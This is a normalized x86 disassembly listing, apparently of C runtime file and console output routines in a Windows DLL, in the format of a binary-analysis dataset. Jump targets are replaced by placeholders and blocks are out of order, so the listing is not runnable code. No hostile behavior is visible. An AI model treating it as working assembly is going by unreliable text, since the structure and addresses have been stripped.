push 0x1
push esi
call sub_100166ee
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_1001e36f
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_1001fce8
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rw-data
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010a44
add esp 0x14
push edi
call sub_10011c31
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_100166ee
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_1001398e
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_10011c31
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_1001fce8
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_10018f74
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_100190d8
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_100167f3
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_100167f3
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10013458
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_1001983d
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_1001fec3
pop ecx
test eax eax
jne r-xdata
call sub_10013458
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1001983d
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_10019919
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1001fdaa
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_100190d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_1001910a
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10020120
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_10016806
mov [ eax ] esi
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10010789
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_10016806
xor esi esi
mov [ eax ] esi
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001fec3
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1001fd25
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_10017c1c
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x1c
call sub_10016806
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_10016819
pop ecx
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_1001f1ce
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_1001ff27
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_10020103
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_10020103
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_1001ff27
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1001983d
push 0x10
push r--data
call sub_10018984
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10016806
and [ eax ] 0x0
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] edi
call sub_100167f3
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_100189c9
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100202c9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001910a
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001990f
mov eax [ ebp - 0x1c ]
sub_10019919
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_100166a9
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_10019962
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_100167f3
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_10019919
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_100190d8
pop ecx
push eax
call sub_1001c869
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_100190d8
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_100190d8
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_100190d8
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_100190d8
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_10019a8d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10020252
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_100167f3
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_10016819
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_10019b02
push 0x10
push r--data
call sub_10018984
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10016806
and [ eax ] 0x0
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] edi
call sub_100167f3
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_100189c9
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100202c9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019a8d
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019bd4
mov eax [ ebp - 0x1c ]
sub_10019bde
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_100190d8
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
push 0x1
push ebx
push eax
call sub_10019b02
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_10019b02
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10019b02
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_10019d7b
mov edi edi
push ebp
mov ebp esp
mov eax 0x1020
call sub_10020120
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_100190d8
mov ebx eax
xor eax eax
cmp [ esi + 0x4 ] eax
pop ecx
mov [ ebp - 0x1018 ] ebx
jge r-xdata
push 0x1
push eax
push eax
push ebx
call sub_1001fdaa
add esp 0x10
mov edi eax
mov [ ebp - 0x1014 ] edi
mov [ ebp - 0x1010 ] edx
test edx edx
jg r-xdata
mov [ esi + 0x4 ] eax
mov eax ebx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
and ebx 0x1f
mov [ ebp - 0x101c ] eax
mov eax [ eax ]
shl ebx 0x6
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
test [ esi + 0xc ] 0x108
mov [ ebp - 0x1005 ] cl
jne r-xdata
jl r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov edi ecx
sub edi edx
mov edx [ esi + 0xc ]
mov [ ebp - 0x100c ] edi
test dl 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x1010 ]
cdq
sub edi eax
sbb ecx edx
mov eax edi
mov edx ecx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jae r-xdata
test dl dl
js r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
mov edx [ ebp - 0x1014 ]
or edx [ ebp - 0x1010 ]
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
xor edx edx
cmp [ eax + 0x30 ] edx
je r-xdata
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x100c ]
jmp r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
shr edi 0x1
mov [ ebp - 0x1020 ] edi
cmp [ esi + 0x4 ] edx
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
cmp edx ecx
jb r-xdata
push edx
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ ebp - 0x1018 ]
call sub_1001fdaa
mov esi eax
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
add eax ebx
add esp 0x10
mov edi edx
cmp esi [ eax + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
jmp r-xdata
mov eax [ ebp - 0x100c ]
xor edx edx
add eax [ ebp - 0x1014 ]
adc edx [ ebp - 0x1010 ]
shr [ ebp - 0x100c ] 0x1
sub ecx [ esi + 0x8 ]
add ecx edx
test [ eax + 0x4 ] 0x80
mov edi ecx
je r-xdata
and [ ebp - 0x100c ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
cmp edi [ eax + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_1001fdaa
add esp 0x10
cmp eax [ ebp - 0x1014 ]
jne r-xdata
inc edx
inc [ ebp - 0x100c ]
push 0x0
lea ecx [ ebp - 0x100c ]
push ecx
push 0x1000
lea ecx [ ebp - 0x1004 ]
push ecx
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x1014 ] edi
sbb [ ebp - 0x1010 ] 0x0
shr edi 0x1
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_1001fdaa
add esp 0x10
test edx edx
jg r-xdata
cmp edx [ ebp - 0x1010 ]
jne r-xdata
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_1001fdaa
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
